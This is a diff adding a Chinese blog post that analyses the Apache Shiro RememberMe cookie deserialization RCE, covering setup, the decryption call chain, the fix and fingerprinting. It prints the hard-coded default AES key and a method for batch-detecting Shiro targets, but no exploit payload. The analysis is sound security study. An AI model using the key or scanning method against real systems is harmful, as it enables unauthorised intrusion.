@@ -152,6 +152,393 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">shiro rce漏洞分析</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-11-28 22:07:45" itemprop="dateCreated datePublished" datetime="2020-11-28T22:07:45+08:00">2020-11-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-12-24 10:04:49" itemprop="dateModified" datetime="2020-12-24T10:04:49+08:00">2020-12-24</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞分析</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在最近这几年，我们在渗透的过程中经常会用到shiro的rce漏洞来打点，直到目前为止还经常会在一些项目或者HW中也会经常遇到shrio的rce，因此了解shiro的RememberMe反序列化导致的命令执行漏洞的原理是至关重要的，在本次分享中，我将和大家一起学习shiro RememberMe反序列化漏洞。</span><br></pre></td></tr></table></figure>
+
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>​    我这里选择网上已经有人搭建好的漏洞环境来搭建环境<code>https://github.com/potats0/ShiroDemo</code>，下载好项目以后使用IDEA导入pom.xml文件，由于我这里使用的MAVEN是阿里云镜像，我使用shiro-core为1.2.4时提示我找不到包，因此我这里使用的是1.2.2版本。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201128221450755.png" alt="image-20201128221450755"></p>
+<p>​    需要的包导入后，找到App.java文件，通过调试来运行。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201128221552395.png" alt="image-20201128221552395"></p>
+<p>​    运行成功后界面如下：</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201128221658967.png" alt="image-20201128221658967"></p>
+<h3 id="Shiro基本知识"><a href="#Shiro基本知识" class="headerlink" title="Shiro基本知识"></a>Shiro基本知识</h3><p>​    我们知道，shiro是一款用来进行权限认证和权限管理的框架，可以帮我们完成认证、授权、加密、会话管理、与Web集成、缓存等功能。</p>
+<p>​    下面我结合着这个漏洞环境的代码带大家一起学习一下shiro的基本知识。</p>
+<p>​    在这个项目的源码文件中，主要包含了4个文件，APP.java内容为启动springboot的内容，这里不做解释了，看下其他文件的内容，首先是MainRealm.java，在介绍这个文件的内容前，我们先了解几个基本的概念。</p>
+<p>​    我们知道，shiro框架的一个主要的功能是用来做身份认证的，在shiro中，主要通过principals （身份）和 credentials（证明）一起来验证用户的身份。</p>
+<h4 id="principals"><a href="#principals" class="headerlink" title="principals"></a><strong>principals</strong></h4><p>​    指用户身份的标识，可以是用户的用户名，手机号等等，但需要确保其唯一性。</p>
+<h4 id="credentials"><a href="#credentials" class="headerlink" title="credentials"></a><strong>credentials</strong></h4><p>​    凭证，一般来说就是密码。</p>
+<h4 id="Realm"><a href="#Realm" class="headerlink" title="Realm"></a><strong>Realm</strong></h4><p>​    域，shiro会从Realm中获取安全数据（用户，角色，权限），当SecurityManager要身份认证，需要从Realm中来确定用户身份以及用户可以访问的权限。</p>
+<p>​    在shiro中，SecurityManager负责身份认证的逻辑，它会委托给Authenticator进行身份认证，Authenticator 会把相应的 token 传入 Realm，从 Realm 获取身份验证信息，如果没有返回 / 抛出异常表示身份验证失败了。此处可以配置多个 Realm，将按照相应的顺序及策略进行访问。</p>
+<p><strong>AuthorizingRealm</strong></p>
+<p>​    在shiro中，默认提供了一些Realm，他们的继承关系如下：</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png" alt="img"> </p>
+<p>​    CachingRealm是带缓存的Realm，里面包含了多个CacheManager属性，具体的缓存在其子类中进行实现。</p>
+<p>​    AuthenticatingRealm是带认证的Realm,该类实现了认证的基本逻辑和缓存逻辑。</p>
+<p>​    AuthorizingRealm主要用来鉴权和获取授权信息的Realm,该类实现了Authorizer，所以可以做鉴权。也实现了PermissionResolverAware，RolePermissionResolverAware因此可以对用户的访问权限做判断。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129131100239.png" alt="image-20201129131100239"></p>
+<p>​    在shiro认证过程中，依赖AuthenticatingRealm的getAuthenticationInfo方法，getAuthenticationInfo会调用我们自定义的doGetAuthenticationInfo方法获取认证的结果。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129132011123.png" alt="image-20201129132011123"></p>
+<p>​    在登录的时候需要将数据封装到<code>Shiro</code>的一个<code>token</code>中，执行shiro的<code>login()</code>方法，<code>Shiro</code>就会自动的调用<code>doGetAuthenticationInfo(AuthenticationToken token)</code>方法获取身份认证信息，在本次环境中，首先通过token.getPrincipal()方法获取username信息，通过authenticationToken.getCredentials()获取密码信息，对用户的用户名和密码进行判断，如果用户用户名为admin,密码为vulhub，认证成功则返回SimpleAuthenticationInfo对象,mainrealm.java的代码如下：</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129122749329.png" alt="image-20201129122749329"></p>
+<h4 id="shiro拦截器"><a href="#shiro拦截器" class="headerlink" title="shiro拦截器"></a><strong>shiro拦截器</strong></h4><p>​    在shiro中使用了与 Servlet 一样的 Filter 接口进行扩展，shiro拦截器的基础类及其继承关系如下：</p>
+<p><img src="https://wiki.jikexueyuan.com/project/shiro/images/14.png" alt="img"></p>
+<p>​    ShiroFilter是整个 Shiro 的入口点，用于拦截需要安全控制的请求进行处理，除了上面的基础拦截器类外，shiro还提供了一些比较常用的默认拦截器。</p>
+<p>​    FormAuthenticationFilter登录拦截器，它主要有两个作用，一个是拦截登录表单提交的路径，创建登录认证所需要的Token令牌，并进入登录认证流程。另一个作用是拦截要求登录后才可以访问的路径，如果已经登录则直接进入到要访问路径，如果未登录则访问被拒绝并跳转到登录页。登录拦截器常用的方法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">createToken创建认证令牌，令牌内存储了登录认证时所需的数据。</span><br><span class="line">onLoginSuccess设置登录成功后的行为。</span><br><span class="line">onAccessDenied设置被拒绝后的行为</span><br><span class="line">setLoginUrl设置登录地址</span><br><span class="line">getUsername获取登录名，表单name值必须是username。</span><br><span class="line">getPassword获取密码，表单name值必须是password。</span><br></pre></td></tr></table></figure>
+
+<p>​    UserFilter用户拦截器，用户已经登录认证 或 已经记住我 的都可以通过。</p>
+<p>​    AnonymousFilter无需认证即可通过。</p>
+<h4 id="拦截器链"><a href="#拦截器链" class="headerlink" title="拦截器链"></a><strong>拦截器链</strong></h4><p>​    Shiro 对 Servlet 容器的 FilterChain 进行了代理，即 ShiroFilter 在继续 Servlet 容器的 Filter 链的执行之前，通过 ProxiedFilterChain 对 Servlet 容器的 FilterChain 进行了代理。当Filter执行的过程中，首先执行shiro的拦截器链，再经过Servlet容器的拦截器链。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129143520958.png" alt="image-20201129143520958"></p>
+<p>​    在shiro中提供了PathMatchingFilterChainResolver来判断请求的url和拦截器的规则是否匹配。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129143926553.png" alt="image-20201129143926553"></p>
+<p>​    DefaultFilterChainManager中维护者一个拦截器链，我们可以通过DefaultFilterChainManager中的方法添加拦截器。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129144850395.png" alt="image-20201129144850395"></p>
+<h4 id="ShiroFilterFactoryBean"><a href="#ShiroFilterFactoryBean" class="headerlink" title="ShiroFilterFactoryBean"></a><strong>ShiroFilterFactoryBean</strong></h4><p>​    通过ShiroFilterFactoryBean类可以方便的配置拦截器的各种基本属性。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setSecurityManager:注入一个SecurityManager类，SecurityManager负责管理整个shiro核心验证功能。</span><br><span class="line">setLoginUrl：配置登录页路径。</span><br><span class="line">setSuccessUrl：配置登录成功页路径。</span><br><span class="line">setUnauthorizedUrl：配置没有权限跳转的页面。</span><br><span class="line">setFilterChainDefinitionMap：设置拦截规则。拦截规则是通过一个Map进行导入的。</span><br><span class="line">setFilters：用于注入自己实现的拦截器类。</span><br></pre></td></tr></table></figure>
+
+<p>​    拦截规则是通过MAP来进行设置的，基本形式如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; filterChainDefinitionMap &#x3D; new LinkedHashMap&lt;String, String&gt;();</span><br><span class="line">filterChainDefinitionMap.put(&quot;&lt;拦截路径&gt;&quot;, &quot;&lt;拦截器名称&gt;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>​    拦截器路径是一个从根路径开始的url，并支持通配符。拦截器名称既可以是shiro内置拦截器的名称比如anon(无需认证的拦截器)、authc（需要认证的拦截器）、user (已经登录成功或使用记住我的拦截器)，perms[role_name] - 需要权限验证的路径使用perms拦截器。中括号内为权限名称列表。</p>
+<hr>
+<p>​    接下来我们看一下shiroConfig.java，这个类是shiro的配置类，在这个类的shiroFilterFactoryBean中，通过setSecurityManager来设置securityManager，在securityManager中，设置了Realm为我们自己定义的mainRealm，RememberMeManager为cookieRememberMeManager，也就是cookie的”记住我”功能。通过setLoginUrl方法来设置未登录时需要认证的地址也就是登录地址。setUnauthorizedUrl方法来设置无权访问时跳转的地址。通过创建LinkedHashMap，设置map.put(“/doLogin”, “anon”)来设置不需要登录就能访问的地址。通过map.put(“/xxx/**”, “user”);来设置用户登录后才能访问的地址。最后通过setFilterChainDefinitionMap将这个map设置到FilterChain中。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129134331085.png" alt="image-20201129134331085"></p>
+<h4 id="Subject"><a href="#Subject" class="headerlink" title="Subject"></a><strong>Subject</strong></h4><p>​    Shiro中认证授权组件Subject，为我们提供了当前用户、角色和授权的相关信息，可以进行登录，退出，权限验证，获取用户信息，session。</p>
+<p>​    通过SecurityUtils.getSubject获取subject对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Subject subject &#x3D; SecurityUtils.getSubject();</span><br></pre></td></tr></table></figure>
+
+<p>​    subject包含如下主要接口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Subject login(Subject subject, AuthenticationToken authenticationToken) throws AuthenticationException;    &#x2F;&#x2F;登陆</span><br><span class="line">void logout(Subject subject);        &#x2F;&#x2F;退出登陆</span><br><span class="line">Subject createSubject(SubjectContext context);    &#x2F;&#x2F;获取subject</span><br><span class="line">Session session &#x3D; subject.getSession(); &#x2F;&#x2F;获取session对象</span><br><span class="line">String currentUser &#x3D; subject.getPrincipal().toString(); &#x2F;&#x2F;获取登录名</span><br></pre></td></tr></table></figure>
+
+<p>​    了解了这些知识，我们看下UserController.java是如何实现的，通过SecurityUtils.getSubject方法获取subject对象，通过login来进行登录，传入的参数为UsernamePasswordToken对象。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129153131427.png" alt="image-20201129153131427"></p>
+<p>​    这里，shiro的基础知识我们大概了解了一些了，下面我们再看一下漏洞。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​    因为之前已经有人分析过shiro的反序列化漏洞了，并且在文章中给出了存在反序列化漏洞的方法，在DefaultSerializer类的deserialize方法中，因此我们可以直接找到这个方法并打上断点 。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130114316497.png" alt="image-20201130114316497"></p>
+<p>​    在这个函数中调用了ObjectInputStream类的readObject方法来进行反序列化操作，下面是整个过程的调用栈</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">deserialize:75, DefaultSerializer (org.apache.shiro.io)</span><br><span class="line">deserialize:514, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">convertBytesToPrincipals:431, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">resolvePrincipals:492, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">createSubject:342, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">buildSubject:846, Subject$Builder (org.apache.shiro.subject)</span><br><span class="line">buildWebSubject:148, WebSubject$Builder (org.apache.shiro.web.subject)</span><br><span class="line">createSubject:292, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilterInternal:359, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:125, OncePerRequestFilter (org.apache.shiro.web.servlet)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:93, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:202, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:96, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:526, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:139, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:92, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:74, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:343, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:367, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:65, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:860, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1591, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure>
+
+<p>​    下面我们分析一下这个漏洞的调用过程，再调用的过程中，我们可以看到拦截器的调用链，已经将shiroFilter写入到tomcat拦截器之前。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130155604254.png" alt="image-20201130155604254"></p>
+<p>​    下面依次调用对应的拦截器，OrderedCharacterEncodingFilter–&gt;OrderedFormContentFilter–&gt;OrderedRequestContextFilter–&gt;ShiroFilterFactoryBean–&gt;WsFilter。</p>
+<p>​    首先调用OrderedCharacterEncodingFilter设置编码</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130161156440.png" alt="image-20201130161156440"></p>
+<p>​    调用OrderedFormContentFilter获取参数，这里参数为空，因此会调用else中的代码。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130161341690.png" alt="image-20201130161341690"></p>
+<p>​    调用OrderedRequestContextFilter完成requestContext的初始化操作。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130162453138.png" alt="image-20201130162453138"></p>
+<p>​    下来就是shiorFilter的调用链，再shior拦截器中调用了createSubject来创建subject对象。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130163400707.png" alt="image-20201130163400707"></p>
+<p>​    跟进createSubject方法，调用了buildWebSubject方法。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130163533846.png" alt="image-20201130163533846"></p>
+<p>​    在 buildWebSubject中调用了其父类的buildSubject方法。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130163606923.png" alt="image-20201130163606923"></p>
+<p>​    跟进父类的buildSubject方法，调用了DefaultSecurityManager的createSubject方法。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130165013406.png" alt="image-20201130165013406"></p>
+<p>​    继续跟进，我们需要关注resolvePrincipals方法。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130165132350.png" alt="image-20201130165132350"></p>
+<p>​    跟进resolvePrincipals方法，判断RememberMeManager是否为空，不为空则调用getRememberedPrincipals。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130170513136.png" alt="image-20201130170513136"></p>
+<p>​    跟进getRememberedPrincipals方法，首先调用了getRememberedSerializedIdentity。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130170719001.png" alt="image-20201130170719001"></p>
+<p>​    跟进getRememberedSerializedIdentity方法，在该方法中，通过this.getCookie().readValue(request, response);获取了cookie的内容，并且判断是否为deleteMe，若为DeleteMe则返回null,否则将继续执行，对获取的cookie的内容进行base64解码并返回。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171245277.png" alt="image-20201130171245277"></p>
+<p>​        返回后会判断获取的cookie的内容是否为空，如果不为空，则调用convertBytesToPrincipals方法。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171552207.png" alt="image-20201130171552207"></p>
+<p>​    在convertBytesToPrincipals调用了decrypt对cookie的内容进行解密。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171453470.png" alt="image-20201130171453470"></p>
+<p>​    在decrypt中，调用cipherService.decrypt进行解密，同时传入了this.getDecryptionCipherKey()的内容。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171804561.png" alt="image-20201130171804561"></p>
+<p>​    我们看一下getDecryptionCipherKey中的key是如何来的，返回了当前对象的decryptionCipherKey属性。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171919629.png" alt="image-20201130171919629"></p>
+<p>​    decryptionCipherKey是在setDecryptionCipherKey中设置的。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130172056694.png" alt="image-20201130172056694"></p>
+<p>​    在setCipherKey中调用了setDecryptionCipherKey进行设置、</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130172145175.png" alt="image-20201130172145175"></p>
+<p>​    setCipherKey中的参数来自于DEFAULT_CIPHER_KEY_BYTES，而这个值是kPH+bIxk5D2deZiIxcaaaA== base64解密后的内容，所以这个key的内容在我们当前的环境下是写死的。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130172223454.png" alt="image-20201130172223454"></p>
+<p>​    继续跟进解密算法，可以看到使用的解密方式是AES方式。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130173904974.png" alt="image-20201130173904974"></p>
+<p>​    将解密后的结果返回后，再转换为字节数组的形式并返回。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174140275.png" alt="image-20201130174140275"></p>
+<p>​    将返回的bytes作为参数传递到deserialize方法中。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174259064.png" alt="image-20201130174259064"></p>
+<p>​    继续跟踪下面的调用</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174337766.png" alt="image-20201130174337766"></p>
+<p>​    最终我们可以看到，将我们通过cookie传入的内容转换为ObjectInputStream,并调用了readObject进行反序列化操作。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174508646.png" alt="image-20201130174508646"></p>
+<p>​    通过上面的分析，我相信我们已经对于shiro反序列化漏洞的基本原理有了大致的了解，这个漏洞要想正常的利用，至关重要的一点是找到解密cookie中传入payload的key，在这个环境中，key是写死的，实际上这个key也可以自己在shiorconfig类中配置加密的key。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130180331183.png" alt="image-20201130180331183"></p>
+<p>​    当我们更换key后，再去利用这个漏洞，由于key不正确无法解密导致无法继续利用。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130180538186.png" alt="image-20201130180538186"></p>
+<p>​    既然重新生成key这么简单，为什么还是有人使用默认的key或者网上公布的其他key？我们看一下这个key解密后的结果就知道了，由于这些key解密后都是一些乱码，不太容易编辑，所以可能很多人会去使用网上别人生成好的key，所以在漏洞利用的过程中有人想到了爆破key的方法。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130180951079.png" alt="image-20201130180951079"></p>
+<p>​    那如果想自己生成key,怎样生成才能满足要求呢,只要使用任意一个16位，24位，32位的字符串base64编码后都是可以作为key的。</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>​        我们尝试切换shiro为高版本，看一下shiro是如何修复反序列化漏洞的，我切换到1.2.7版本的shiro，我们可以看到在该版本中，key默认并不是写死的，而是由cipherService.generateNewKey().getEncoded()来生成的key。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201164200537.png" alt="image-20201201164200537"></p>
+<p>​    生成key的代码如下</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201164541425.png" alt="image-20201201164541425"></p>
+<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><h4 id="如何识别shiro"><a href="#如何识别shiro" class="headerlink" title="如何识别shiro?"></a><strong>如何识别shiro?</strong></h4><p>​        要检测一个shiro是否存在反序列化漏洞，首先需要对shiro这个框架做一个识别，目前大部分的方法都是通过rememberMe=deleteMe;来识别的，但是并不是我们请求的所有地址都会返回rememberMe=deleteMe,但是在实战中我们可能需要批量去检测shiro框架，我们该如何识别？</p>
+<p>​        通过之前的分析我们知道，无论我们访问哪个url，都会经过shiro的拦截器，而在shiro的拦截器中会获取cookie中rememberMe的内容并进行解密，并且通过之前的分析，我们知道解密是由convertBytesToPrincipals（）完成的，如果我们传入的rememberMe不能正常的反序列化，就会抛出异常，调用onRememberedPrincipalFailure方法。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170537270.png" alt="image-20201201170537270"></p>
+<p>​    该方法经过几层调用最终调用了this.getCookie().removeFrom(request, response);方法</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170614952.png" alt="image-20201201170614952"></p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170630060.png" alt="image-20201201170630060"></p>
+<p><strong><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170639745.png" alt="image-20201201170639745"></strong></p>
+<p>​    在removeFrom中，会在返回包header加上rememberMe=deleteMe，因此无论我们访问任何使用了shiro框架的路由，只需要在请求头中的cookie中加入rememberMe=xxx，如果目标使用了shiro，则会返回rememberMe=deleteMe，也就是说我们可以通过一个包来识别是否使用了shiro框架。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170725328.png" alt="image-20201201170725328"></p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170959832.png" alt="image-20201201170959832"></p>
+<p>​    了解了这些，我们可以写一个简单的python脚本来批量识别shiro，这里注意我将重定向设置为false，否则我们在请求时会跟进302跳转，但跳转后的结果里可能没有rememberMe=deleteMe。<br><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201180626070.png" alt="image-20201201180626070"></p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201180604356.png" alt="image-20201201180604356"></p>
